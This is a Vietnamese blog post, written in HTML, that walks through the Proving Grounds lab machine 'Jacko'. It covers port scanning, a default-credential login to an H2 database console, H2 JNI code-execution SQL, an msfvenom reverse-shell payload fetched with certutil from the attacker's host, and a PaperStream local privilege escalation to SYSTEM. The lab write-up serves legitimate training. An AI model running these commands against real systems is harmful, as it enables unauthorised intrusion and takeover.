@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewDifficulty: Offsec để Intermediate, còn Community rate HARD :v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Proving Grounds] Jacko">
+<meta property="og:url" content="https://guyintheclouds.com/2021/07/01/jacko-pg/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewDifficulty: Offsec để Intermediate, còn Community rate HARD :v">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/jacko-pg.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/7.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/8.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/9.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/10.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/07/01/jacko-pg/12.png">
+<meta property="article:published_time" content="2021-07-01T02:41:16.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.599Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="proving grounds">
+<meta property="article:tag" content="hard">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/jacko-pg.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/07/01/jacko-pg/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/07/01/jacko-pg/","path":"2021/07/01/jacko-pg/","title":"[Proving Grounds] Jacko"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Proving Grounds] Jacko | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">3.</span> <span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-shell"><span class="nav-number">4.</span> <span class="nav-text">Get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">5.</span> <span class="nav-text">Privileges Escalation</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/07/01/jacko-pg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Proving Grounds] Jacko | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Proving Grounds] Jacko
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-07-01 09:41:16" itemprop="dateCreated datePublished" datetime="2021-07-01T09:41:16+07:00">2021-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Proving-Grounds/" itemprop="url" rel="index"><span itemprop="name">Proving Grounds</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/jacko-pg.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Difficulty: Offsec để Intermediate, còn Community rate HARD :v </p>
+<span id="more"></span>
+<p>IP Victim: 192.168.163.66<br>IP Attacker: 192.168.49.55</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Oài, xem là máy mục tiêu đang có những port nào mở và dịch vụ chạy đằng sau nó, bla bla…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- --open --min-rate 3000 192.168.163.66</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 15:54 +07</span><br><span class="line">Nmap scan report for 192.168.206.66</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line">8082/tcp open  blackice-alerts</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 44.31 seconds</span><br><span class="line"></span><br><span class="line">$ nmap -sC -sV -p 80,135,139,445,7680,8082 192.168.163.66</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 15:55 +07</span><br><span class="line">Nmap scan report for 192.168.206.66</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: H2 Database Engine (redirect)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">7680/tcp open  pando-pub?</span><br><span class="line">8082/tcp open  http          H2 database http console</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-06-13T08:56:17</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 80.22 seconds</span><br></pre></td></tr></table></figure>
+<p>Phân tích một chút, có thể đoán đoán máy mục tiêu đang sử dụng hệ điều hành Windows, mà thực ra tôi biết thừa nó chạy Windows rồi, đề bài để cái logo Windows mà :v<br>Hoặc để ý vào port 80 và nhận thấy phần version có tên “Microsoft IIS httpd 10.0”, uy tín luôn.<br>Sơ qua thì:</p>
+<ul>
+<li>HTTP server trên 2 port 80 và 8082</li>
+<li>SMB trên 2 port 139 và 445</li>
+<li>RPC trên port 135</li>
+<li>??? trên port 7680 :))) tạm thời chịu</li>
+</ul>
+<p>Giao diện khi truy cập vào port 80 và 8082 thì như này đây:<br><img src="/2021/07/01/jacko-pg/1.png"><br>Và…<br><img src="/2021/07/01/jacko-pg/2.png"><br>Tin tôi đi, tôi đéo biết nó là mẹ gì đâu, có thể là một giao diện quản lý Database nào đó na ná như cái PhpMyAdmin mà tôi đã từng gặp. Với ô <em>username</em> đang có giá trị mặc định hiển thị là <em>sa</em>, tôi đoán DBMS đang sử dụng là MSSQL. Kệ mẹ nó, cứ nhấn Login xem sao :)) Bùm!<br><img src="/2021/07/01/jacko-pg/3.png"><br>Login thành công với thông tin đăng nhập mặc định, my god!<br>Giờ thì thử tìm kiếm exploit về thằng <em>H2 console</em> này xem có khai thác RCE được không.<br><img src="/2021/07/01/jacko-pg/4.png"><br>Nhận thấy có 3 exploit cho phép RCE, với phiên bản 1.4.196 và 1.4.199, đối chiếu với phiên bản <em>H2 Database</em> đang sử dụng trên máy mục tiêu là 1.4.199, khớp ngon lành, khai thác thôi!</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p><em>H2 Database 1.4.199 - JNI Code Execution (<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49384">https://www.exploit-db.com/exploits/49384</a>)</em><br>Bám theo các bước trong PoC, đầu tiên là ghi một file thư viện .DLL vào trong thư mục có quyền ghi (C:\Windows\Temp\):</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CSVWRITE(<span class="string">&#x27;C:\Windows\Temp\JNIScriptEngine.dll&#x27;</span>, CONCAT(<span class="string">&#x27;SELECT NULL &quot;&#x27;</span>, </span><br><span class="line"><span class="type">CHAR</span>(<span class="number">0x4d</span>),<span class="type">CHAR</span>(<span class="number">0x5a</span>),<span class="type">CHAR</span>(<span class="number">0x90</span>),<span class="type">CHAR</span>(<span class="number">0x00</span>),<span class="type">CHAR</span>(<span class="number">0x03</span>),<span class="type">CHAR</span>(<span class="number">0x00</span>),<span class="type">CHAR</span>(<span class="number">0x00</span>),<span class="type">CHAR</span>(<span class="number">0x00</span>)...</span><br><span class="line"><span class="string">&#x27;ISO-8859-1&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>Sau đó thực hiện load file thư viện này và đặt tên (alias) thành <em>“JNIScriptEngine_eval”</em>.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> System_load <span class="keyword">FOR</span> &quot;java.lang.System.load&quot;;</span><br><span class="line"><span class="keyword">CALL</span> System_load(<span class="string">&#x27;C:\Windows\Temp\JNIScriptEngine.dll&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> JNIScriptEngine_eval <span class="keyword">FOR</span> &quot;JNIScriptEngine.eval&quot;;</span><br></pre></td></tr></table></figure>
+<p>All done! Thực thi lệnh <code>whoami</code>.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> JNIScriptEngine_eval(<span class="string">&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>Kết quả trả về là <em>jacko\tony</em>, đã vl!<br><img src="/2021/07/01/jacko-pg/5.png"><br>Ok, tiếp theo lấy reverse shell.</p>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>Tạo một payload với MSFvenom:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.55 LPORT=445 -f exe -o duma445.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: duma445.exe</span><br></pre></td></tr></table></figure>
+<p>Khởi chạy HTTP server trên thư mục chứa payload vừa tạo để máy mục tiêu tải duma443.exe về.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> JNIScriptEngine_eval(<span class="string">&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;certutil -urlcache -f http://192.168.49.55/duma445.exe C:/Windows/Temp/duma445.exe&quot;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/01/jacko-pg/6.png"><br>Trên máy Kali của tôi lúc này sẽ xuất hiện request từ phía máy mục tiêu với mã response 200, xác nhận tải file payload thành công.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ updog -p 80</span><br><span class="line">[+] Serving /home/kali/Dropbox/Labs/PG/Machines/Jacko...</span><br><span class="line"> * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)</span><br><span class="line">192.168.55.66 - - [01/Jul/2021 01:23:58] &quot;GET /duma445.exe HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.55.66 - - [01/Jul/2021 01:23:59] &quot;GET /duma445.exe HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+<p>Giờ thì chỉ cần bật lắng nghe trên cổng 445 và chạy payload.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> JNIScriptEngine_eval(<span class="string">&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;C:/Windows/Temp/duma445.exe&quot;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/01/jacko-pg/7.png"><br>Ok, lấy Flag đầu tiên nằm trong <code>C:\Users\tony\Desktop\local.txt</code><br><img src="/2021/07/01/jacko-pg/8.png"><br><strong><code>local.txt: c64e9635a454835427a021f0ac96680b</code></strong></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Sau một hồi tim kiếm các thể loại, tải Winpeas lên chạy các kiểu con đà điểu, không ăn thua lắm. Tôi quay về với cách try hard :&#x2F;<br>Tìm kiếm xem máy này đã cài đặt các chương trình gì?<br><img src="/2021/07/01/jacko-pg/9.png"><br>Hmm….</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit PaperStream</span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                        |  Path</span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br><span class="line">PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation       | windows/local/49382.ps1</span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
+<p>&#x3D;)) Ok “Local Privilege Escalation”<br>Làm theo PoC, tạo một payload .DLL để lấy reverse shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -f dll -o duma8082.dll LHOST=192.168.49.55 LPORT=8082</span><br></pre></td></tr></table></figure>
+<p>Do tôi đang có quyền của user <em>tony</em> nên tôi hoàn toàn có thể thao tác trong thư mục <em>C:&#x2F;Users&#x2F;tony</em>, sửa đổi lại đường dẫn <code>$PayloadFile</code> trong script và tải 49382.ps1, duma8082.dll vào thư mục <em>C:&#x2F;Users&#x2F;tony</em>.<br>Một vấn đề nữa là <code>powershell</code> phải sử dụng đường dẫn tuyệt đối để truy cập, và phải <strong>Unrestricted</strong> ExecutionPolicy để có thể thực thi được script.<br>Như này:<br><img src="/2021/07/01/jacko-pg/10.png"><br>Bật lắng nghe trên công 8082 và thực thi script 49382.ps1, lấy được shell <em>system</em>.<br><img src="/2021/07/01/jacko-pg/12.png"><br>Done!</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/proving-grounds/" rel="tag"># proving grounds</a>
+              <a href="/tags/hard/" rel="tag"># hard</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/27/using-computer-safely-talk/" rel="prev" title="[Talk] Làm sao để sử dụng máy tính một cách an toàn?">
+                  <i class="fa fa-angle-left"></i> [Talk] Làm sao để sử dụng máy tính một cách an toàn?
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/08/03/how-i-hacked-the-first-website/" rel="next" title="[Talk] Tôi đã &#39;hách&#39; trang web đầu tiên trong đời mình như thế nào?">
+                  [Talk] Tôi đã 'hách' trang web đầu tiên trong đời mình như thế nào? <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
